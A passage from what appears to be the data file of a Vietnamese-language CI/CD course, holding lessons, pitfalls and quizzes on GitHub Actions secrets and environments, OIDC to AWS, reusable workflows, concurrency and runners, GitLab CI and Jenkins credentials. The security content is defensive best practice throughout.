        q: "`cache-to: type=gha,mode=max` khác `mode=min` ở điểm nào?",
        options: ["max nén mạnh hơn", "max lưu cả layer của các stage trung gian", "max chỉ lưu stage cuối", "Không khác"],
        answer: 1,
        explain: "mode=max xuất cache cho mọi layer, gồm cả stage trung gian của multi-stage build; mode=min chỉ lưu layer của image kết quả."
      },
      {
        q: "Cache key tốt cho npm dependency nên dựa trên gì?",
        options: ["Thời gian hiện tại", "Hash của package-lock.json và hệ điều hành", "Tên người commit", "Số thứ tự run"],
        answer: 1,
        explain: "Lockfile quyết định nội dung dependency nên hash của nó là key chính xác. Thời gian hay số run khiến cache không bao giờ khớp."
      }
    ]
  },
  "p08.m1.t5": {
    sections: [
      {
        h: "Secret, variable và environment",
        p: [
          "GitHub Actions có hai loại giá trị cấu hình. Secret được mã hoá, bị che thành `***` trong log, dùng cho mật khẩu, token, khoá API; đọc bằng `secrets.TEN`. Variable là giá trị không nhạy cảm như region, tên cluster, URL; hiện rõ trong log, đọc bằng `vars.TEN`. Đừng để thứ không bí mật vào secret, vì như vậy log bị che khắp nơi và khó debug.",
          "Cả hai có thể đặt ở ba cấp: organization, repository và environment. Cấp càng hẹp thì ưu tiên càng cao. Environment là cấp quan trọng nhất cho CD: secret của environment `production` chỉ được cấp cho job khai báo `environment: production`, và chỉ sau khi các quy tắc bảo vệ của environment đó được thoả."
        ]
      },
      {
        h: "Environment protection rules",
        p: [
          "Trong Settings → Environments, mỗi environment có thể cấu hình các quy tắc sau. Kết hợp chúng, bạn có một cổng production chặt chẽ mà không cần công cụ ngoài."
        ],
        list: [
          "Required reviewers: tối đa 6 người hoặc team; job chờ một người trong số đó duyệt.",
          "Prevent self-review: người kích hoạt deploy không được tự duyệt.",
          "Wait timer: chờ một khoảng thời gian trước khi deploy.",
          "Deployment branches and tags: chỉ nhánh `main` hoặc tag `v*` mới được deploy vào production.",
          "Secret và variable riêng cho environment."
        ]
      },
      {
        h: "Ví dụ job deploy dùng environment",
        p: [
          "Job dưới đây chỉ nhận `DB_MIGRATION_URL` của production khi đã được duyệt. Khai báo `url` giúp giao diện GitHub hiển thị liên kết tới môi trường vừa deploy."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/deploy-prod.yml",
          src: `name: Deploy production
on:
  workflow_dispatch:
    inputs:
      image_tag:
        type: string
        required: true

permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://api.example.com
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - name: Migration
        env:
          DATABASE_URL: \${{ secrets.DB_MIGRATION_URL }}   # secret cấp environment
        run: ./scripts/migrate.sh
      - name: Deploy
        env:
          CLUSTER: \${{ vars.ECS_CLUSTER }}                # variable, không nhạy cảm
          IMAGE_TAG: \${{ inputs.image_tag }}
        run: ./scripts/ecs-deploy.sh "$CLUSTER" "$IMAGE_TAG"`
        }
      },
      {
        h: "Giới hạn và thực hành tốt",
        p: [
          "Việc che secret trong log chỉ khớp chuỗi nguyên văn. Nếu secret bị biến đổi (base64, cắt chuỗi, JSON nhiều dòng) thì có thể lộ ra. Không in secret, không ghi nó vào artifact hay cache. Secret không được truyền cho workflow chạy từ PR fork, và `GITHUB_TOKEN` ở đó chỉ có quyền đọc.",
          "Tốt nhất là giảm số secret dài hạn: dùng OIDC để lấy credential cloud tạm thời (bài tiếp theo), và dùng secret manager của cloud cho secret của ứng dụng lúc chạy. Secret trong GitHub khi đó chỉ còn vài thứ thật sự cần."
        ]
      }
    ],
    summary: [
      "Secret cho giá trị nhạy cảm (bị che trong log), variable cho giá trị thường.",
      "Có ba cấp: organization, repository, environment; cấp hẹp hơn được ưu tiên.",
      "Environment protection: required reviewers, prevent self-review, wait timer, giới hạn nhánh.",
      "Secret của environment chỉ được cấp cho job đã qua quy tắc bảo vệ."
    ],
    pitfalls: [
      "Để secret production ở cấp repository: mọi workflow, mọi nhánh đều đọc được.",
      "Cho phép mọi nhánh deploy vào environment production, ai tạo nhánh cũng có thể kích hoạt deploy.",
      "In secret đã qua biến đổi (base64) ra log, cơ chế che không nhận ra."
    ],
    quiz: [
      {
        q: "Giá trị `AWS_REGION=ap-southeast-1` nên lưu ở đâu?",
        options: ["Secret", "Variable", "Hard-code trong Dockerfile", "Commit vào file .env"],
        answer: 1,
        explain: "Region không nhạy cảm nên để trong variable để log dễ đọc. Hard-code hay commit .env làm config khó thay đổi."
      },
      {
        q: "Secret đặt ở environment `production` được cấp cho job nào?",
        options: ["Mọi job trong repo", "Chỉ job khai báo `environment: production` và đã qua quy tắc bảo vệ", "Chỉ job chạy theo schedule", "Job chạy từ PR fork"],
        answer: 1,
        explain: "Secret cấp environment gắn với job dùng environment đó và chỉ có sau khi được duyệt. PR fork không nhận secret."
      },
      {
        q: "Tính năng nào ngăn người kích hoạt deploy tự duyệt deploy của chính mình?",
        options: ["Wait timer", "Prevent self-review", "Deployment branches", "Concurrency"],
        answer: 1,
        explain: "Prevent self-review buộc một người khác duyệt. Wait timer chỉ trì hoãn; deployment branches giới hạn nhánh."
      }
    ]
  },
  "p08.m1.t6": {
    sections: [
      {
        h: "Vấn đề của access key dài hạn",
        p: [
          "Cách cũ là tạo IAM user, sinh `AWS_ACCESS_KEY_ID` và `AWS_SECRET_ACCESS_KEY`, dán vào GitHub secret. Key này sống mãi cho tới khi ai đó nhớ xoay vòng. Nếu bị lộ qua log, qua một action độc hại hay qua máy của một developer, kẻ tấn công dùng được nó từ bất kỳ đâu, bất kỳ lúc nào.",
          "OIDC (OpenID Connect) giải quyết bằng cách không có key nào cả. Mỗi lần job chạy, GitHub cấp một token JWT ngắn hạn, ký bởi `https://token.actions.githubusercontent.com`, trong đó ghi rõ repo, nhánh, environment, workflow. AWS kiểm tra chữ ký và các claim, rồi trả về credential tạm thời có hạn khoảng một giờ."
        ]
      },
      {
        h: "Luồng hoạt động",
        list: [
          "Một lần duy nhất: tạo OIDC identity provider trong AWS IAM và một IAM role có trust policy.",
          "Trust policy chỉ tin token có `aud` là `sts.amazonaws.com` và `sub` khớp repo, environment cụ thể.",
          "Job khai báo `permissions: id-token: write` để được phép xin token OIDC.",
          "Action `configure-aws-credentials` đổi token lấy credential tạm thời qua `sts:AssumeRoleWithWebIdentity`.",
          "Các step sau dùng AWS CLI/SDK như bình thường."
        ],
        p: [
          "Claim `sub` có dạng như `repo:my-org/task-api:environment:production` khi job dùng environment, hoặc `repo:my-org/task-api:ref:refs/heads/main` khi không dùng environment. Nhờ vậy bạn có thể tạo role production chỉ cho environment production assume."
        ]
      },
      {
        h: "Ví dụ workflow",
        p: [
          "Thiếu `id-token: write` là lỗi phổ biến nhất: action sẽ báo không lấy được token. Lưu ý khi khai báo `permissions` ở job, mọi quyền không liệt kê đều về `none`, nên hãy thêm `contents: read` để checkout được."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/deploy.yml",
          src: `name: Deploy
on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write   # bắt buộc để xin token OIDC
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: \${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ap-southeast-1
      - run: aws sts get-caller-identity`
        }
      },
      {
        h: "Không chỉ AWS",
        p: [
          "Google Cloud (Workload Identity Federation), Azure (federated credential), HashiCorp Vault và nhiều registry đều hỗ trợ OIDC từ GitHub Actions. GitLab CI cũng có cơ chế tương tự qua `id_tokens`. Nguyên tắc luôn giống nhau: tin danh tính do nền tảng CI ký, ràng buộc thật chặt các claim, cấp quyền tối thiểu cho role.",
          "Role deploy chỉ nên có quyền đúng việc cần làm, ví dụ cập nhật một ECS service và đẩy image lên một repository ECR, không phải `AdministratorAccess`."
        ]
      }
    ],
    summary: [
      "OIDC thay access key dài hạn bằng credential tạm thời cho mỗi lần chạy.",
      "Job cần `permissions: id-token: write`.",
      "Trust policy phải ràng buộc `aud` và `sub` (repo, environment) thật chặt.",
      "IAM role chỉ cấp quyền tối thiểu cho việc deploy."
    ],
    pitfalls: [
      "Trust policy dùng `repo:my-org/*` hoặc bỏ điều kiện `sub`: repo khác, thậm chí PR, cũng assume được role production.",
      "Quên `id-token: write`, hoặc khai báo permissions ở job mà quên `contents: read`.",
      "Vẫn giữ access key cũ trong secret sau khi chuyển sang OIDC."
    ],
    quiz: [
      {
        q: "Quyền nào bắt buộc để job xin được token OIDC từ GitHub?",
        options: ["contents: write", "id-token: write", "packages: write", "actions: read"],
        answer: 1,
        explain: "`id-token: write` cho phép job yêu cầu JWT OIDC. Các quyền khác không liên quan đến việc cấp token."
      },
      {
        q: "Lợi ích chính của OIDC so với access key lưu trong secret?",
        options: ["Chạy nhanh hơn", "Không có credential dài hạn; credential tạm thời, gắn với repo và environment", "Không cần IAM role", "Không cần trust policy"],
        answer: 1,
        explain: "OIDC loại bỏ key dài hạn và ràng buộc danh tính theo claim. Nó vẫn cần IAM role và trust policy."
      },
      {
        q: "Điều kiện `sub` nào an toàn nhất cho role deploy production?",
        options: ["repo:my-org/*", "*", "repo:my-org/task-api:environment:production", "repo:*:ref:refs/heads/main"],
        answer: 2,
        explain: "Giới hạn đúng repo và environment production. Các lựa chọn có dấu sao cho phép quá nhiều nguồn assume role."
      }
    ]
  },
  "p08.m1.t7": {
    sections: [
      {
        h: "Hai cách tái sử dụng",
        p: [
          "Khi công ty có hàng chục repo, copy cùng một file CI vào mọi nơi sẽ nhanh chóng lệch nhau. GitHub Actions có hai cơ chế tái sử dụng với phạm vi khác nhau."
        ],
        list: [
          "Reusable workflow (`on: workflow_call`): tái sử dụng cả một workflow gồm nhiều job, có environment, có runner riêng. Gọi ở cấp job: `jobs.x.uses: org/repo/.github/workflows/file.yml@ref`.",
          "Composite action (`runs.using: composite`): gói nhiều step thành một step. Gọi ở cấp step: `steps[].uses: org/repo/path@ref`. Chạy trên runner của job gọi nó.",
          "Quy tắc chọn: cần chuẩn hoá cả quy trình (build, scan, deploy có duyệt) thì dùng reusable workflow; cần gom vài step lặp lại (setup Node, cài dependency) thì dùng composite action."
        ]
      },
      {
        h: "Ví dụ composite action",
        p: [
          "Composite action đặt trong file `action.yml`. Mỗi step `run` trong composite phải khai báo `shell`."
        ],
        code: {
          lang: "yaml",
          file: ".github/actions/setup-app/action.yml",
          src: `name: Setup app
description: Cài Node, khôi phục cache và cài dependency
inputs:
  node-version:
    description: Phiên bản Node
    default: "24"
runs:
  using: composite
  steps:
    - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
      with:
        node-version: \${{ inputs.node-version }}
        cache: npm
    - run: npm ci
      shell: bash`
        }
      },
      {
        h: "Gọi reusable workflow từ repo dùng chung",
        p: [
          "Repo `my-org/ci-templates` chứa workflow chuẩn. Các repo dịch vụ chỉ cần vài dòng. `secrets: inherit` chuyển toàn bộ secret của repo gọi sang, tiện nhưng rộng; truyền từng secret tường minh an toàn hơn. Tham chiếu tới workflow dùng chung cũng nên pin theo commit SHA, giống như action."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read
  packages: write

jobs:
  node-ci:
    # Thay <commit-sha> bằng SHA đầy đủ 40 ký tự của bản bạn muốn dùng
    uses: my-org/ci-templates/.github/workflows/node-service.yml@<commit-sha> # v3.2.0
    with:
      node-version: "24"
      run-integration: true
    secrets:
      SONAR_TOKEN: \${{ secrets.SONAR_TOKEN }}

  lint-local:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: ./.github/actions/setup-app
      - run: npm run lint`
        }
      },
      {
        h: "Versioning và pin theo SHA",
        p: [
          "Action và workflow dùng chung cần được version như thư viện: tag `v1.2.0`, changelog, không phá vỡ input cũ. Nhưng phía người dùng thì nên pin theo commit SHA đầy đủ, vì tag trong Git có thể bị di chuyển. Ngày 19/3/2026, kẻ tấn công dùng credential bị lộ để force-push 76/77 tag của `aquasecurity/trivy-action` thành mã độc đánh cắp secret. Ai pin theo SHA thì không bị ảnh hưởng.",
          "Để việc pin SHA không thành gánh nặng, bật Dependabot cho ecosystem `github-actions`: nó mở PR cập nhật SHA và giữ comment version bên cạnh."
        ]
      },
      {
        h: "Đừng trừu tượng hoá quá sớm",
        p: [
          "Tái sử dụng có giá: workflow dùng chung càng nhiều tham số thì càng khó đọc, khó debug, và mỗi thay đổi ảnh hưởng tới mọi repo. Hãy bắt đầu bằng việc copy khi mới có hai, ba repo; khi đã thấy rõ phần chung ổn định thì mới tách ra thành reusable workflow.",
          "Workflow dùng chung nên có test riêng (một repo mẫu chạy nó mỗi khi có thay đổi), có changelog, và phát hành theo version để các repo nâng cấp dần chứ không bị ép cùng lúc."
        ]
      }
    ],
    summary: [
      "Reusable workflow tái sử dụng cả quy trình nhiều job; composite action gom nhiều step.",
      "Composite action: step `run` phải có `shell`.",
      "Truyền secret tường minh thay vì `secrets: inherit` khi có thể.",
      "Pin action và workflow dùng chung theo commit SHA, cập nhật bằng Dependabot."
    ],
    pitfalls: [
      "Tham chiếu `@main` tới workflow dùng chung: một commit lỗi ở repo template làm hỏng CI của mọi repo.",
      "Quên `shell: bash` trong step của composite action.",
      "Dùng `secrets: inherit` cho workflow bên thứ ba, trao toàn bộ secret cho code bạn không kiểm soát."
    ],
    quiz: [
      {
        q: "Bạn muốn chuẩn hoá quy trình build, scan và deploy có duyệt cho 30 repo. Nên dùng gì?",
        options: ["Composite action", "Reusable workflow", "Copy file workflow", "Script bash"],
        answer: 1,
        explain: "Reusable workflow chứa được nhiều job, environment và quy tắc duyệt. Composite action chỉ là một nhóm step trong một job."
      },
      {
        q: "Vì sao nên pin action theo commit SHA thay vì tag?",
        options: ["SHA ngắn hơn", "Tag có thể bị force-push trỏ sang mã khác, còn SHA thì bất biến", "GitHub không hỗ trợ tag", "SHA chạy nhanh hơn"],
        answer: 1,
        explain: "Sự cố trivy-action 3/2026 là ví dụ tag bị ghi đè thành mã độc. SHA trỏ tới đúng một commit nên không thể bị thay."
      },
      {
        q: "Trong composite action, step `run` bắt buộc phải có gì?",
        options: ["`shell`", "`id`", "`env`", "`if`"],
        answer: 0,
        explain: "Composite action yêu cầu khai báo `shell` cho mỗi step run. Các thuộc tính khác là tuỳ chọn."
      }
    ]
  },
  "p08.m1.t8": {
    sections: [
      {
        h: "Concurrency: huỷ run cũ, tránh deploy chồng nhau",
        p: [
          "Khi bạn push ba commit liên tiếp vào một PR, mặc định có ba run CI chạy song song, hai run đầu là lãng phí. Khối `concurrency` gom các run vào một nhóm; trong một nhóm chỉ có một run đang chạy và tối đa một run chờ.",
          "Với CI của PR, đặt `cancel-in-progress: true` để huỷ run cũ. Với deploy thì ngược lại: không nên huỷ một deploy đang chạy giữa chừng vì có thể để hệ thống ở trạng thái dở dang. Hãy dùng nhóm theo môi trường với `cancel-in-progress: false` để các deploy xếp hàng."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/ci.yml",
          src: `name: CI
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ci-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: \${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - run: npm ci && npm test

  deploy:
    if: github.event_name == 'push'
    needs: test
    runs-on: ubuntu-latest
    concurrency:
      group: deploy-production
      cancel-in-progress: false   # xếp hàng, không huỷ deploy đang chạy
    steps:
      - run: echo "deploy"`
        }
      },
      {
        h: "Khi nào cần self-hosted runner",
        list: [
          "Cần truy cập mạng nội bộ: database, Kubernetes API private, hệ thống on-premise.",
          "Build nặng cần nhiều CPU, RAM, GPU hoặc kiến trúc ARM riêng.",
          "Yêu cầu tuân thủ: dữ liệu và mã nguồn không được rời hạ tầng công ty.",
          "Chi phí: khối lượng build rất lớn, tự vận hành rẻ hơn tính theo phút."
        ],
        p: [
          "Job chọn runner qua label, ví dụ `runs-on: [self-hosted, linux, x64, build-heavy]`. Trên Kubernetes, Actions Runner Controller (ARC) tạo runner tạm thời theo nhu cầu, mỗi job một pod mới rồi xoá, đỡ phải quản lý máy thủ công."
        ]
      },
      {
        h: "Rủi ro bảo mật của self-hosted",
        p: [
          "Runner của GitHub là máy ảo mới cho mỗi job rồi bị huỷ. Self-hosted runner mặc định thì được dùng lại: file, credential, tiến trình còn sót từ job trước có thể bị job sau đọc. Nếu repo công khai cho phép PR từ fork chạy trên self-hosted runner, bất kỳ ai cũng có thể chạy code trong mạng nội bộ của bạn.",
          "Vì vậy: không dùng self-hosted runner cho repo public; ưu tiên runner ephemeral (chạy một job rồi huỷ); chia runner group theo mức tin cậy, runner có quyền vào production chỉ phục vụ repo và workflow được chỉ định; và không lưu credential dài hạn trên máy runner."
        ]
      }
    ],
    summary: [
      "`concurrency` gom run theo nhóm; `cancel-in-progress` huỷ run cũ.",
      "CI của PR nên huỷ run cũ; deploy nên xếp hàng, không huỷ giữa chừng.",
      "Self-hosted runner cho mạng nội bộ, máy mạnh, tuân thủ hoặc tiết kiệm chi phí.",
      "Ưu tiên runner ephemeral (ARC), không dùng self-hosted cho repo public."
    ],
    pitfalls: [
      "Đặt `cancel-in-progress: true` cho deploy production, làm deploy bị cắt ngang và hệ thống ở trạng thái dở.",
      "Group concurrency không chứa `github.ref`, khiến các PR khác nhau huỷ lẫn nhau.",
      "Self-hosted runner dùng lại lâu dài, tích tụ credential và file từ các job cũ."
    ],
    quiz: [
      {
        q: "Với workflow deploy production, cấu hình concurrency nào hợp lý?",
        options: ["cancel-in-progress: true", "Nhóm cố định theo môi trường, cancel-in-progress: false", "Không dùng concurrency, cho chạy song song", "Nhóm theo tên người commit"],
        answer: 1,
        explain: "Deploy nên xếp hàng theo môi trường và không bị huỷ giữa chừng. Chạy song song dễ gây deploy chồng nhau."
      },
      {
        q: "Vì sao không nên dùng self-hosted runner cho repo public?",
        options: ["GitHub tính phí cao", "PR từ fork có thể chạy code tùy ý trên máy trong mạng của bạn", "Runner không hỗ trợ Linux", "Không có label"],
        answer: 1,
        explain: "Code không tin cậy chạy trên máy của bạn là rủi ro lớn nhất. Các lựa chọn còn lại không đúng."
      },
      {
        q: "Actions Runner Controller (ARC) mang lại lợi ích gì?",
        options: ["Thay GitHub Actions bằng Jenkins", "Tạo runner tạm thời trên Kubernetes theo nhu cầu", "Tăng số phút miễn phí", "Tự viết workflow"],
        answer: 1,
        explain: "ARC tự co giãn runner dạng pod trên Kubernetes, mỗi job dùng runner mới. Nó không thay thế GitHub Actions hay tăng phút miễn phí."
      }
    ]
  },
  "p08.m2.t0": {
    sections: [
      {
        h: "Cấu trúc .gitlab-ci.yml",
        p: [
          "GitLab CI dùng một file `.gitlab-ci.yml` ở gốc repo. Mỗi khoá cấp cao không phải từ khoá dành riêng là một job. Job thuộc về một `stage`; mặc định các stage chạy tuần tự, các job cùng stage chạy song song. Job được thực thi bởi GitLab Runner, một agent bạn cài trên máy hoặc Kubernetes, hoặc runner dùng chung của GitLab.com.",
          "Khái niệm tương ứng với GitHub Actions khá thẳng: job giống job, `script` giống các step `run`, `services` giống service container, `environment` giống environment, và `needs` tạo phụ thuộc trực tiếp giữa các job."
        ],
        list: [
          "`rules:` quyết định job có chạy không, thay cho `only/except` cũ.",
          "`needs:` tạo DAG: job chạy ngay khi job nó cần xong, không chờ cả stage.",
          "`artifacts:` lưu file giữa các job, có `expire_in` và `reports` (junit, coverage).",
          "`cache:` tăng tốc, key có thể dựa theo file lockfile.",
          "`environment:` ghi nhận deploy, hỗ trợ protected environment và duyệt."
        ]
      },
      {
        h: "Ví dụ với workflow rules và DAG",
        p: [
          "Khối `workflow: rules:` dưới đây là mẫu phổ biến để tránh pipeline chạy hai lần (một cho branch, một cho merge request). Job `build` dùng `needs` nên chạy ngay khi `test` xong, không cần chờ `lint`."
        ],
        code: {
          lang: "yaml",
          file: ".gitlab-ci.yml",
          src: `workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never
    - if: $CI_COMMIT_BRANCH

stages: [test, build, deploy]

default:
  image: node:24-alpine
  interruptible: true

lint:
  stage: test
  script:
    - npm ci --cache .npm --prefer-offline
    - npm run lint
  cache:
    key:
      files: [package-lock.json]
    paths: [.npm/]

test:
  stage: test
  script:
    - npm ci --cache .npm --prefer-offline
    - npm test
  artifacts:
    when: always
    expire_in: 1 week
    reports:
      junit: reports/junit.xml

build:
  stage: build
  needs: [test]
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  script:
    - echo "build image $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"

deploy_production:
  stage: deploy
  needs: [build]
  interruptible: false
  environment:
    name: production
    url: https://example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual
  script:
    - ./scripts/deploy.sh production`
        }
      },
      {
        h: "GitLab Runner và bảo mật",
        p: [
          "Runner có nhiều executor: `docker` (mỗi job một container, phổ biến nhất), `shell` (chạy thẳng trên máy, ít cô lập), `kubernetes` (mỗi job một pod). Từ GitLab 16, runner được tạo trên giao diện và đăng ký bằng runner authentication token có tiền tố `glrt-`, thay cho registration token cũ.",
          "Variable có thể đánh dấu Protected (chỉ cấp cho nhánh, tag được bảo vệ) và Masked (che trong log). Secret production nên luôn là Protected, kết hợp protected environment để chỉ một nhóm người được chạy job deploy. `interruptible: true` cùng tuỳ chọn tự huỷ pipeline dư thừa giúp huỷ pipeline cũ khi có commit mới, tương tự concurrency của GitHub."
        ]
      }
    ],
    summary: [
      "Job thuộc stage; stage chạy tuần tự, job cùng stage chạy song song.",
      "Dùng `rules:` thay `only/except`, và `workflow: rules:` để tránh pipeline trùng.",
      "`needs:` tạo DAG giúp pipeline nhanh hơn.",
      "Variable Protected + protected environment để bảo vệ deploy production."
    ],
    pitfalls: [
      "Không có `workflow: rules:`, mỗi push vào nhánh có MR tạo hai pipeline.",
      "Để variable production không Protected, mọi nhánh đều đọc được.",
      "Dùng executor `shell` trên máy dùng chung, job này đọc được file của job khác."
    ],
    quiz: [
      {
        q: "Trong GitLab CI hiện hành, nên dùng gì để quyết định khi nào job chạy?",
        options: ["only/except", "rules", "when: always ở mọi job", "tags"],
        answer: 1,
        explain: "`rules:` là cú pháp khuyến nghị, linh hoạt hơn only/except. `tags` dùng để chọn runner, không phải điều kiện chạy."
      },
      {
        q: "Tác dụng của `needs:` trong GitLab CI?",
        options: ["Chọn runner", "Cho job chạy ngay khi các job cần thiết xong, không chờ cả stage", "Lưu cache", "Tạo biến môi trường"],
        answer: 1,
        explain: "`needs` biến pipeline thành DAG. Chọn runner dùng `tags`; cache dùng `cache`."
      },
      {
        q: "Tương đương của Required reviewers GitHub trong GitLab CI là gì?",
        options: ["`when: manual` kết hợp protected environment", "`cache:`", "`artifacts:`", "`image:`"],
        answer: 0,
        explain: "Job manual trên protected environment chỉ người được phép mới chạy được, tương đương cổng duyệt. Các khoá khác không liên quan."
      }
    ]
  },
  "p08.m2.t1": {
    sections: [
      {
        h: "Vì sao vẫn cần biết Jenkins",
        p: [
          "Jenkins là máy chủ CI mã nguồn mở lâu đời, cực kỳ linh hoạt nhờ hệ sinh thái plugin. Ở Việt Nam, rất nhiều ngân hàng, công ty viễn thông, công ty outsource vẫn dùng Jenkins vì chạy được hoàn toàn trong mạng nội bộ và tích hợp với các hệ thống cũ. Khi đi làm, khả năng cao bạn sẽ gặp một Jenkinsfile.",
          "Jenkins có hai cú pháp pipeline: Scripted (Groovy tự do) và Declarative (cấu trúc cố định, dễ đọc). Hãy dùng Declarative cho pipeline mới."
        ],
        list: [
          "`agent`: nơi chạy, ví dụ `any`, một label, một Docker image hoặc pod Kubernetes (cần plugin tương ứng).",
          "`stages`/`stage`/`steps`: cấu trúc pipeline; `parallel` để chạy song song.",
          "`when`: điều kiện chạy stage, ví dụ `branch 'main'`.",
          "`environment` và `credentials()`: nạp secret từ Jenkins Credentials.",
          "`post`: `always`, `success`, `failure` để báo cáo và dọn dẹp."
        ]
      },
      {
        h: "Credentials an toàn",
        p: [
          "Credential lưu trong Jenkins, không trong code. Helper `credentials('id')` với loại username/password tạo ra ba biến: `REG` (dạng user:pass), `REG_USR` và `REG_PSW`. Luôn dùng nháy đơn trong `sh` để shell, chứ không phải Groovy, đọc biến. Nháy kép khiến Groovy nội suy secret vào chuỗi lệnh và có thể lộ trong log."
        ],
        code: {
          lang: "groovy",
          file: "Jenkinsfile",
          src: `pipeline {
  agent none
  options { timeout(time: 20, unit: 'MINUTES'); disableConcurrentBuilds() }
  environment {
    REG = credentials('registry')   // tạo REG_USR và REG_PSW
  }
  stages {
    stage('Test') {
      agent { docker { image 'node:24-alpine' } }
      steps { sh 'npm ci && npm test' }
      post {
        always { junit allowEmptyResults: true, testResults: 'reports/*.xml' }
      }
    }
    stage('Push') {
      agent { label 'docker' }        // agent có sẵn Docker CLI
      when { branch 'main' }
      steps {
        // Nháy đơn: shell đọc biến, Groovy không nội suy secret
        sh 'echo "$REG_PSW" | docker login registry.example.com -u "$REG_USR" --password-stdin'
      }
    }
  }
}`
        }
      },
      {
        h: "Shared library: DRY cho nhiều repo",
        p: [
          "Shared library là repo Groovy chứa hàm dùng chung. File trong `vars/` trở thành bước gọi được từ Jenkinsfile. Nên pin library theo tag hoặc commit để thay đổi ở library không làm hỏng mọi pipeline cùng lúc."
        ],
        code: {
          lang: "groovy",
          file: "vars/nodeService.groovy",
          src: `// Trong repo shared library
def call(Map cfg = [:]) {
  def nodeVersion = cfg.node ?: '24'
  pipeline {
    agent { docker { image "node:\${nodeVersion}-alpine" } }
    stages {
      stage('Install') { steps { sh 'npm ci' } }
      stage('Test')    { steps { sh 'npm test' } }
    }
  }
}

// Trong Jenkinsfile của từng dịch vụ:
// @Library('devpath-shared@v1.4.0') _
// nodeService(node: '24')`
        }
      },
      {
        h: "Vận hành Jenkins",
        p: [
          "Đừng chạy build trên controller. Controller chỉ điều phối; build chạy trên agent, lý tưởng là agent tạm thời trong Docker hoặc Kubernetes. Plugin cần được cập nhật thường xuyên vì nhiều lỗ hổng Jenkins nằm ở plugin. Cấu hình nên được quản lý bằng code (Configuration as Code plugin) thay vì click tay trên giao diện."
        ]
      },
      {
        h: "Multibranch pipeline và webhook",
        p: [
          "Multibranch Pipeline tự quét repo, tạo job cho mỗi nhánh và mỗi pull request có Jenkinsfile, rồi xoá job khi nhánh bị xoá. Kết hợp với webhook từ GitHub, GitLab hoặc Bitbucket để Jenkins build ngay khi có push, thay vì poll repo mỗi vài phút vừa chậm vừa tốn tài nguyên.",
          "Kết quả build được báo ngược về PR dưới dạng status check, nên branch protection vẫn hoạt động như với GitHub Actions."
        ]
      }
    ],
    summary: [
      "Dùng Declarative pipeline: agent, stages, steps, when, post.",
      "Credential lưu trong Jenkins, nạp bằng `credentials()` hoặc `withCredentials`.",
      "Dùng nháy đơn trong `sh` để Groovy không nội suy secret.",
      "Shared library cho code dùng chung; build chạy trên agent, không trên controller."
    ],
    pitfalls: [
      "Viết `sh \"docker login -p $REG_PSW\"` với nháy kép, secret bị Groovy chèn vào chuỗi lệnh.",
      "Để plugin cũ nhiều năm không cập nhật, mở đường cho lỗ hổng đã biết.",
      "Gọi shared library không pin phiên bản, thay đổi ở library làm vỡ mọi pipeline."
    ],
    quiz: [
      {
        q: "Với `REG = credentials('registry')` loại username/password, biến nào chứa mật khẩu?",
        options: ["REG_PASS", "REG_PSW", "REG_SECRET", "PASSWORD"],
        answer: 1,
        explain: "Jenkins tạo `REG_USR` và `REG_PSW` cho credential username/password. Các tên khác không tồn tại."
      },
      {
        q: "Vì sao nên dùng nháy đơn trong bước `sh` có secret?",
        options: ["Nháy đơn chạy nhanh hơn", "Để shell đọc biến môi trường, tránh Groovy nội suy secret vào chuỗi lệnh", "Jenkins không hỗ trợ nháy kép", "Để tắt log"],
        answer: 1,
        explain: "Nháy kép là GString, Groovy thay giá trị vào trước khi chạy, làm secret xuất hiện trong lệnh. Jenkins vẫn hỗ trợ nháy kép."
      },
      {
        q: "Nơi nên chạy build trong kiến trúc Jenkins?",
        options: ["Trên controller", "Trên agent, lý tưởng là agent tạm thời", "Trên máy developer", "Trên database server"],
        answer: 1,
        explain: "Controller chỉ điều phối; chạy build trên controller vừa chậm vừa cho phép build truy cập cấu hình và secret của Jenkins."
      }
    ]
  },
  "p08.m2.t2": {
    sections: [
      {
        h: "Mọi công cụ CI đều nói cùng một ngôn ngữ",
        p: [
          "Khi đã hiểu GitHub Actions, bạn đọc được hầu hết công cụ CI khác vì khái niệm giống nhau: pipeline gồm các job, job chạy trên agent hoặc executor, có cache, artifact, biến bí mật, cổng duyệt tay và điều kiện theo nhánh. Chỉ tên gọi và cú pháp khác."
        ],
        list: [
          "CircleCI: SaaS, cấu hình `.circleci/config.yml`; job chạy trên executor (docker, machine); `workflows` nối job; `orbs` là gói cấu hình tái sử dụng; job `type: approval` là cổng duyệt tay.",
          "Buildkite: giao diện SaaS nhưng agent chạy trên hạ tầng của bạn; `pipeline.yml` gồm các step, `wait` là rào chắn, `block` là cổng duyệt; pipeline có thể tự sinh thêm step động.",
